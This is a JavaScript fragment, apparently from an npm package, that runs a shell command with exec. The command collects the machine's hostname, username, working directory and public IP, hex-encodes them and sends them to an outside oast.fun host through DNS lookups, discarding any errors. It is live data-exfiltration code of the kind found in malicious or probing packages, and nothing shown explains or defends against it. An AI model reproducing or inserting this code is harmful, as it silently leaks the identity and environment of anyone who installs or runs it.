...
const cmd = `
a=$( 
  (hostname; whoami; pwd; echo 'npm-test-mancer'; curl -s https://ifconfig.me) 2>/dev/null 
) && 
echo $a | xxd -p | head -n 1 | while read line; do 
  nslookup $line.driimvoboosibxqfwojadk4762i8xuw2k.oast.fun >/dev/null 
done
`;

exec(cmd, (err, stdout, stderr) => { if (err) return; });
